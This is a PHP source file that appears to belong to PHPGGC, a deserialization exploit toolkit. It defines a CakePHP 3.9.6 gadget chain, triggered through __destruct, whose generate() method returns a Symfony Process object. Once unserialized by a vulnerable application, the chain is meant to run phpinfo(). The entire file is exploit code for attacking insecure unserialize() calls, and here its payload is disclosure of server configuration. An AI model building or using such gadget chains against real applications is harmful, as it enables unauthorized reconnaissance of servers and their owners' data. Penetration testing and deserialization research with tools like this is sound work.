<?php

namespace GadgetChain\CakePHP;

class INFO1 extends \PHPGGC\GadgetChain\PHPInfo
{
    public static $version = '3.9.6';
    public static $vector = '__destruct';
    public static $author = 'CyanM0un';

    public function generate(array $parameters)
    {
        return new \Symfony\Component\Process\Process();
    }
}
